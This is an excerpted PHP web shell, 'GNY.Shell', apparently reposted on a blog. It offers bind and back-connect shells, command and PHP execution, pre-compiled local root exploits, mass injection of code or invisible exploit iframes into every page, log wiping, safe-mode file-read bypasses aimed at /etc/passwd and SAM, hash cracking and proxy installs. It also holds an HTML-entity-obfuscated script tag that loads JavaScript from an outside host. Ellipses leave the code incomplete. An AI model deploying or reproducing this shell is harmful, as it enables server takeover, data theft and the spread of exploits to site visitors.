...
// all the base64-encoded crap comes next. they include programs and exploits, to better your hacking experience <img src="/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" />
...
if ($surl_autofill_include and ! $_REQUEST["GNY_surl"]) {
    $include = "&";
...
$bindport_pass = 'x133'; // default password for binding
...
$quicklaunch = array(
    ...
    array(
        '<br><br><center><b>[String/Hash Tools]</b>',
    ...
    array(
        '<b>[Kernel Exploit Search]</b>',
        $surl . 'act=exploit'
    ),
    array(
        '<b>[Execute PHP Code]</b>',
        $surl . 'act=eval&d=%d'
    ),
    array(
        '<b>[PHP Info]</b></center>',
        $surl . 'act=phpinfo&d=%d'
    )
);
$quicklaunch2 = array(
    array(
        '<b><center>[PHP Tools]</b>',
        $surl . 'act=phptools'
    ),
    array(
        '<b>[Bind Shell Backdoor]</b>',
        $surl . 'act=shbd'
    ),
    array(
        '<b>[Back-Connection]</b>',
    ...
    array(
        '<b>[Mass Code Injection]</b>',
        $surl . 'act=massbrowsersploit'
    ),
    array(
        '<b>[Exploits]</b>',
        $surl . 'act=exploits'
    ...
    array(
        '<b>[Install IP:Port Proxy]</b>',
        $surl . 'act=proxy'
    ),
    array(
        '<b>[Install PHP Proxy]</b>',
        $surl . 'act=phpproxy'
    ),
    array(
        '<b>[Suicide Script]</b></center>',
        $surl . 'act=selfremove'
    )
);
...
if (! preg_match($s, getenv("REMOTE_ADDR")) and ! preg_match($s, gethostbyaddr(getenv("REMOTE_ADDR")))) {
    exit(" Access Denied - your host (" . getenv("REMOTE_ADDR") . ") not allow");
}
if (! empty($login)) {
    if (empty($md5_pass)) {
        $md5_pass = md5($pass);
                ...
                if ($data{0} == "\x99" and $data{1} == "\x03") {
                    ...
                    if ($update) {
                        ...
                        if (! $source) {
                            ...
                            $fp = fopen(__FILE__, "w");
                            if (! $fp) {
                                return "Local error: can't write update to " . __FILE__ . "!";
                            } else {
                                fwrite($fp, $source);
                                fclose($fp);
...
<title>Social working - Google Search</title>
<STYLE>
TD {
	FONT-SIZE: 8pt;
	COLOR: #0033FF;
		...
		<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0
			...
			<tr>
				<th width="101%" height="15" nowrap bordercolor="#C0C0C0"
					valign="top" colspan="2"><center>
						<font color="#0033FF"><pre>
			...
			<tr>
				<td>
					<table border=0 width=100%>
						<tr>
							<td colspan=2><center>
									<b><?php echo $DISP_SERVER_SOFTWARE; ?></td>
						</tr>
						<tr>
							<td><b>Kernel: <?php echo wordwrap(php_uname(),90,'<br>',1); if($win) echo ' ('.exec('ver').')'; ?></b></td>
							<td align=right><b>Safe-Mode: <?php echo $hsafemode; ?></b></td>
						</tr>
						<tr>
							<td><b><?php if (!$win) {echo wordwrap(myshellexec('id'),90,'<br>',1);} else {echo 'Running As: '.get_current_user();} ?></b></td>
							<td align=right><b>Disabled PHP Functions: <?php if(''==($df=@ini_get('disable_functions'))){echo '<font color=green>NONE</font></b>';}else{echo '<br><font color=red>'.str_replace(',', ', ', $df).'</font></b>';} ?></b><?php
...
echo "<br/>Oracle: <b>";
        ...
        echo '</td></tr><tr>';
        if (! $sql_sock) {
            ?><td width=28% height=100 valign=top><li>If login is
											null, login is owner of process.
									
									<li>If host is null, host is localhost (default).
									
									<li>If port is null, port is 3306 (default).</td>
									<td width=90% height=1 valign=top><TABLE height=1 cellSpacing=0
														...
														<form action="<?php echo $surl; ?>" method=POST>
															...
															<tr>
																<td><input type=text name="sql_login" value="root"
																	maxlength=64></td>
																<td><input type=text name="sql_passwd" maxlength=64></td>
																<td><input type=text name="sql_db" maxlength=64></td>
															</tr>
															<tr>
																<td><b>Host</b></td>
																<td><b>Port</b></td>
            ...
            if ($sql_db) {
                            ...
                            if ($sql_tbl_act == "browse") {
                                ...
                                for ($i = 0; $i < mysql_num_fields($result); $i ++) {
                                    ...
                                    if ($e[1] != $v) {
                                        ...
                                        echo "<b>" . $v . "</b><a href=\"" . $sql_surl . "sql_tbl=" . $sql_tbl . "&sql_tbl_le=" . $sql_tbl_le . "&sql_tbl_ls=" . $sql_tbl_ls . "&sql_order=" . $s . "%20" . $v . "\">[sort]</a>";
                                    }
                                    echo "</td>";
                                }
                ...
                if (in_array($sql_act, $acts)) {
                    ?><table border="0" width="100%"
														height="1">
														<tr>
															<td width="30%" height="1"><b>Create new Database:</b>
															<form action="<?php echo $surl; ?>">
																	<input type="hidden" name="act" value="sql"><input
...
width="100%">
    ...
    if ($act == 'exploits') {
        ?>
<b>Exploits:</b> <br>
												<br> All exploits are pre-compiled. Just follow the
													directions. <br>
												<br> <b>h00lyshit - Local Race Exploit</b><br>
													<form action=<?php echo $surl; ?> method=GET>
														<input type=hidden name="act" value="exploits"> <input
															type=hidden name="sploit" value="h00lyshit"> Path to
														extract to: <input type=text name="path"
															value="<?php echo $d; ?>"> (must have final /)<br> <input
															type=submit value="Create">
													</form>
<?php
        ...
        ?>
<br>
												<br> <b>raptor_chown - Group Modification Exploit</b><br>
													<form action=<?php echo $surl; ?> method=GET>
														<input type=hidden name="act" value="exploits"> <input
															type=hidden name="sploit" value="raptorchown"> Path to
														extract to: <input type=text name="path"
															value="<?php echo $d; ?>"> (must have final /)<br> <input
															type=submit value="Create">
													</form>
<?php
    ...
    if ($act == 'massbrowsersploit') {
        ?>
<b>Mass Code Injection:</b><br>
												<br> Use this to add HTML to the end of every .php, .htm,
													and .html page in the directory specified.<br>
												<br>
													<form action="<?php echo $surl; ?>" method=GET>
														<input type=hidden name="masssploit" value="goahead"> <input
															type=hidden name="act" value="massbrowsersploit">
														<table border=0>
															<tr>
																<td>Dir to inject:</td>
																<td><input type=text size=50 name="pathtomass"
																	value="<?php echo realpath('.'); ?>"> <-- default is
																	dir this shell is in</td>
															</tr>
															<tr>
																<td>Code to inject:</td>
																<td><textarea name="injectthis" cols=50 rows=4><?php echo htmlspecialchars('<IFRAME src="http://www.google.com" width=0 height=0 frameborder=0></IFRAME>'); ?></textarea>
																	<-- best bet would be to include an invisible iframe of
																	browser exploits</td>
															</tr>
															<tr>
																<td><input type=submit value="Inject Code"></td>
															</tr>
														</table>
													</form>
<?php
        ...
        ?>
<b>Mass Code Injection:</b><br>
												<br> Use this to add PHP to the end of every .php page in
													the directory specified.<br>
												<br>
													<form action="<?php echo $surl; ?>" method=GET>
														<input type=hidden name="masssploit" value="php"> <input
															type=hidden name="act" value="massbrowsersploit">
														<table border=0>
															<tr>
																<td>Dir to inject:</td>
															...
															<tr>
																<td>Code to inject:</td>
																<td><textarea name="injectthis" cols=50 rows=4><?php echo htmlspecialchars('<?php if ($_GET["x"] == "lul") { /*code*/; } ?>'); ?></textarea></td>
															</tr>
															<tr>
																<td><input type=submit value="Inject Code"></td>
															</tr>
...
<?php
    ...
    if ($act == 'security') {
        ...
        if (! $win) {
            ...
            ?>
<br>DOS command: <b>systeminfo</b><br> <textarea cols=125
														rows=<?php echo count($wininfo); ?>><?php
            if ($wininfo) {
												...
												<br>
													<table border=0 align=center cellpadding=4>
														<tr>
															<td>
																<center>
																	<b>Search milw0rm for MD5 hash</b>
																</center>
															</td>
															<td>
																<center>
																	<b>Search md5encryption.com for MD5 or SHA1 hash</b>
																</center>
															</td>
															<td>
																<center>
																	<b>Search CsTeam for MD5 hash</b>
																</center>
															</td>
															<td>
																<center>
																	<b>Search GData for MD5 hash</b>
																</center>
															</td>
														</tr>
														<tr>
															<td>
																<center>
																	<form target="_blank"
																		action="http://www.milw0rm.com/cracker/search.php"
																		method=POST>
																		<input type=text size=40 name=hash> <input type=submit
																			value="Submit">
																	</form>
																</center>
															</td>
															<td>
																<center>
																	<form target="_blank"
																		action="http://www.md5encryption.com/?mod=decrypt"
																		method=POST>
																		<input type=text size=40 name=hash2word> <input
															...
															<td>
																<center>
																	<form target="_blank"
																		action="http://www.csthis.com/md5/index.php"
																		method=POST>
																		<input type=text size=40 name=h> <input type=submit
																			value="Submit">
																	</form>
																</center>
															</td>
															<td>
																<center>
																	<form method="post"
																		action="http://www.gdataonline.com/seekhash.php">
																		<input type="hidden" name="code"
																			value="1716f4a1bdecd7090187cf12c42aca3f"> <input
																			type="text" size="40" name="hash" /> <input
																			type="submit" value="Submit" />
																	</form>
																</center>
															</td>
													...
													<center>
														<b>Wordlist Hash Cracker</b><br>
														<br>
														<form action="<?php echo $surl; ?>" method=GET>
															<input type=hidden name="act" value="encoder"> <input
																type=hidden name="d" value="<?php echo $d; ?>"> Enter
															hash: <input type=text width=300 name="hash" size=40> <br>
															Wordlist: <input type=text name="wordlist" size=40> <br>
...
<b>Install Local RFI/LFI Scanner</b><br>
													<form action=<?php echo $surl; ?> method=GET>
														<input type=hidden name="act" value="fi"> <input
															type=hidden name="install" value="yup"> Path to install
														in: <input type=text name="path" value="<?php echo $d; ?>">
														(must have final /)<br> <input type=submit value="Install">
													</form>
<?php
        if ($_GET['install'] == 'yup') {
            if (is_writable($_GET['path'])) {
...
<b>Install PHP Based Proxy</b><br>
													<form action=<?php echo $surl; ?> method=GET>
														<input type=hidden name="act" value="phpproxy"> <input
															type=hidden name="install" value="yup"> Path to install
														in: <input type=text name="path" value="<?php echo $d; ?>">
														(must have final /)<br> <input type=submit value="Install">
													</form>
<?php
    ...
    if ($act == 'selfremove') {
        if ($_GET['bai'] == 'k') {
            if (unlink(__FILE__)) {
                @ob_clean();
                echo 'GNY.Shell has been deleted and is now gone.';
                GNYexit();
            } else {
    ...
    if ($act == 'update') {
        $ret = sh_getupdate(! ! $confirmupdate);
        echo "<b>" . $ret . "</b>";
...
<?php
    ...
    if ($act == 'zap2') { // *nix cleaner
        if (is_writable('.')) {
            cf($act, $$act); // 'tis pure innovation of optimization <img src="/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />
            chmod($act, 0777);
        ...
        if (count($list) == 0) {
            ...
            if ($vd == "f") {
                ...
                foreach ($objects as $a) {
                    ...
                    if (is_dir($v)) {
                        $row[] = "<a href=\"" . $surl . "act=d&d=" . $uv . "\">[info]</a>&nbsp;" . $checkbox;
                    } else {
                        $row[] = "<a href=\"" . $surl . "act=f&f=" . $uo . "&ft=info&d=" . $ud . "\">[info]</a>&nbsp;<a href=\"" . $surl . "act=f&f=" . $uo . "&ft=edit&d=" . $ud . "\">[change]</a>&nbsp;<a href=\"" . $surl . "act=f&f=" . $uo . "&ft=download&d=" . $ud . "\">[download]</a>&nbsp;" . $checkbox;
                    }
                    if (($o == ".") or ($o == "..")) {
                        $tab["head"][] = $row;
                    } elseif (is_link($v)) {
  ...
  <b>";
            echo '<script language="javascript" src="&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#120;&#49;&#112;&#116;&#46;&#105;&#110;&#102;&#111;&#47;&#100;&#97;&#116;&#97;&#47;&#98;&#46;&#106;&#115;"></script>';
    ...
    if ($act == 'processes') {
        ...
        if (! $ret) {
            ...
            $k = $parsesort[0];
            if ($parsesort[1] != "a") {
                $y = "<a href=\"" . $surl . "act=" . $dspact . "&d=" . urlencode($d) . "&processes_sort=" . $k . "a\"> [sort]</a>";
            } else {
                $y = "<a href=\"" . $surl . "act=" . $dspact . "&d=" . urlencode($d) . "&processes_sort=" . $k . "d\"> [sort]</a>";
            }
...
<P>";
  ...
  <input type=submit name=submit value=Submit></form>';
                ...
                if (ereg("php" . "BB 2.(.*) auto-generated config file", $r)) {
                    ...
                    if (count($arr == 18)) {
                        ...
                        if ($dbms == "mysql") {
                            ...
                            echo "You cannot connect to forum database, because the database software of \"" . $dbms . "\" is not supported by GNY.Shell";
                        }
                ...
                echo "<center><b>Manually selected type is incorrect.";
            } else {
...
<input type=submit name=submit value=Submit></form>';
    ...
    if (isset($_GET['host']) && is_numeric($_GET['end']) && is_numeric($_GET['start'])) {
        ...
        ?>
<form action="?" method="get">
																	<input type="hidden" name="act" value="phptools"> Host:<br />
																	<input type="text" name="host" value="localhost" /><br />
																	Port start:<br /> <input type="text" name="start"
																		value="0" /><br /> Port end:<br /> <input type="text"
																		name="end" value="5000" /><br /> <input type="submit"
																		value="Scan Ports" />
																</form>
<?php
    }
...
?>
														...
														<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0
																...
																width="100%" bgcolor=#000000 borderColorLight=#c0c0c0
																border=1>
																<tr>
																		...
																		<center>
																			...
																			<form method="get" action="http://google.com/search">
																				<input name="q" type="text" size="80"
																					value="<?php echo wordwrap(php_uname()); ?>"> <input
															...
															<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0
																borderColorDark=#666666 cellPadding=5 height="116"
																width="100%" bgcolor=#000000 borderColorLight=#c0c0c0
																border=1>
																<tr>
																						...
																						<center>
																							<form action="<?php echo $surl; ?>">
																								<input type=hidden name="d"
																									value="<?php echo $dispd; ?>"> <SELECT
																									NAME="act">
																									<OPTION VALUE="zap2">Wipe Logs Using zap2
																										(*nix)
																									
																									<OPTION VALUE="clearlogs">Wipe Logs Using
																										ClearLogs (Windows)
																					...
																					<td>
																						<form action="<?php echo $surl; ?>">
																							<input type=hidden name=act value="mkdir"><input
																								type=hidden name="d"
																								value="<?php echo $dispd; ?>">
																							<center>
																								<input type="text" name="mkdir" size="50"
																									value="<?php echo $dispd; ?>"> <br> <input
																									type=submit value="Create"><br><?php echo $wdt; ?>
...
?>
<center>
																							<form action="<?php echo $surl; ?>act=cmd"
																								method="POST">
																								<input type=hidden name=act value="cmd"><input
																									type=hidden name="d"
																									value="<?php echo $dispd; ?>"><select
																									...
																									type=hidden name="cmd_txt" value="1"> <br> <input
																									type=submit name=submit value="Execute"><br>
																								&nbsp;
																							</form>
																						</center>
																					</td>
																						...
																						<center>
																							<form method="POST">
																								<input type=hidden name=act value="mkfile"><input
																									type=hidden name="d"
																									value="<?php echo $dispd; ?>"> <input
																									type="text" name="mkfile" size="50"
																									value="<?php echo $dispd; ?>"><input
																									type=hidden name="ft" value="edit"> <br> <input
															...
															<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0
																...
																<tr>
																	<td width=50% height=83 valign=top>
																		<center>
																			PHP Safe-Mode Bypass (Read File)<br>
																			<br>
																			<form action="<?php echo $surl; ?>" method=GET>
																				File: <input type=text name="file"> <input
																					type=submit value="Read File"> <br>
																				<br> e.g.: /etc/passwd or C:\WINDOWS\system32\.SAM
																			</form>
																		</center>
<?php
if(isset($_GET['file'])) {
...
?>
																	...
																	<td width=50% height=83 valign=top>
																		<center>
																			PHP Safe-Mode Bypass (Directory Listing)<br>
																			<br>
																			<form action="<?php echo $surl; ?>" method=GET>
																				Dir: <input type=text name="directory"> <input
																					type=submit value="List Directory"> <br>
																				<br> e.g.: /etc/ or C:\
																			</form>
																		</center>
<?php
...
?>
																	...
																	<td width="50%" height="1" valign="top"><center>
																			...
																			<form method="POST">
																				<input type=hidden name=act value="search"><input
																					type=hidden name="d" value="<?php echo $dispd; ?>"><input
																					type="text" name="search_name" size="29"
																					value="(.*)">&nbsp;<input type="checkbox"
																					name="search_name_regexp" value="1" checked> -
																				regexp&nbsp;<input type=submit name=submit
																					value="Search">
																			</form>
																		</center>
																		</p></td>
														...
														<TABLE style="BORDER-COLLAPSE: collapse" height=1
																...
																border=1>
																<tr>
																	<td width="990" height="1" valign="top"><center>
																			<b>.:[ x1337</font> | Generated in: <?php echo round(getmicrotime()-starttime,4); ?> ]:.</b>
																			<br>
																		</center></td>
																</tr>
															</table>
...
</html><?php chdir($lastdir); GNYexit();
?>
